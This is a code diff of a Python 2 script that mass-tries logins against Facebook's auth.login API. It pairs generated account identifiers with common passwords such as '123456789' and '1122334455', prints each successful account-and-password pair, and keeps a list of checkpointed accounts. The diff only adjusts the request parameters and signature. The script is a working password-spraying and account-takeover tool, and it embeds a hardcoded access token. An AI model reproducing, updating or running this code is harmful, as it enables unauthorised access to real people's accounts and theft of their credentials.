@@ -158,7 +158,7 @@ def action():
 
         try:
             pass1 = user
-            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="  + k + c + user + '&locale=en_US&password=' + pass1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='  + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
@@ -174,7 +174,7 @@ def action():
                 cpb.append(c + user + pass1)
             else:
                 pass2 = '1122334455'
-            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass2 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
@@ -190,7 +190,7 @@ def action():
                 cpb.append(c + user + pass2)
             else:
                 pass3 = '1234554321'
-            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass3 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
@@ -206,7 +206,7 @@ def action():
                 cpb.append(c + user + pass3)
             else:
                 pass4 = '112233112233'
-            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
@@ -222,7 +222,7 @@ def action():
                 cpb.append(c + user + pass4)
             else:
                pass5 = '123456789'
-            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass5 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
@@ -238,7 +238,7 @@ def action():
                 cpb.append(c + user + pass5)
             else:
                  pass6 = '112233445566'
-            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass6 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6" )
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm' )
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
